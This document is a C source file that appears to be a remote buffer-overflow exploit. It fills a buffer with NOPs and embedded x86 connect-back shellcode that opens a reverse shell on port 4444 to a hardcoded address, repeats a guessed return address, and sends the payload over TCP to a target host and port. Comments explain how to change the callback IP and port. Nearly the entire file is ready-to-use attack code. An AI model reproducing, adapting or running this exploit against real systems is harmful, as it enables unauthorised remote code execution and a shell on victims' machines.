#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#define BUF_SIZE 1064

char shellcode[] =
    "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
    "\x06\x51\xb1\x01\x51\xb1\x02\x51"
    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
    "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
    "\xB9\x11\x11\x11\x11\x81\xF1\x1B\x40\x11\x17\x51\x31\xC9\x66\x68\x11\x5c"
    "\xb1\x02\x66\x51\x89\xe7\xb3"
    "\x10\x53\x57\x52\x89\xe1\xb3\x03"
    "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
    "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
    "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
    "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
    "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
    "\x2f\x62\x69\x89\xe3\x50\x53\x89"
    "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
    "\x01\xcd\x80";

// standard offset (probably must be modified)
#define RET 0xbffff28b

int main(int argc, char *argv[])
{
  char buffer[BUF_SIZE];
  int s, i, size;
  struct sockaddr_in remote;
  struct hostent *host;

  if (argc != 3)
  {
    printf("Usage: %s target-ip port \n", argv[0]);
    return -1;
  }
  // filling buffer with NOPs
  memset(buffer, 0x90, BUF_SIZE);

  // Modify the connectback ip address and port. In this case, the shellcode connects to 192.168.2.101 on port 17*256+92=4444
  // shellcode[33] = 192;
  // shellcode[34] = 168;
  // shellcode[35] = 207;
  // shellcode[36] = 144;

  // shellcode[39] = 17;
  // shellcode[40] = 92;
  // copying shellcode into buffer
  memcpy(buffer + 900 - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);

  // Copying the return address multiple times at the end of the buffer...
  for (i = 901; i < BUF_SIZE - 4; i += 4)
  {
    *((int *)&buffer[i]) = RET;
  }
  buffer[BUF_SIZE - 1] = 0x0;
  // getting hostname
  host = gethostbyname(argv[1]);
  if (host == NULL)
  {
    fprintf(stderr, "Unknown Host %s\n", argv[1]);
    return -1;
  }
  // creating socket...
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0)
  {
    fprintf(stderr, "Error: Socket\n");
    return -1;
  }
  // state Protocolfamily , then converting the hostname or IP address, and getting  port number
  remote.sin_family = AF_INET;
  remote.sin_addr = *((struct in_addr *)host->h_addr);
  remote.sin_port = htons(atoi(argv[2]));
  // connecting with destination host
  if (connect(s, (struct sockaddr *)&remote, sizeof(remote)) == -1)
  {
    close(s);
    fprintf(stderr, "Error: connect\n");
    return -1;
  }
  // sending exploit string
  size = send(s, buffer, sizeof(buffer), 0);
  if (size == -1)
  {
    close(s);
    fprintf(stderr, "sending data failed\n");
    return -1;
  }
  // closing socket
  close(s);
}
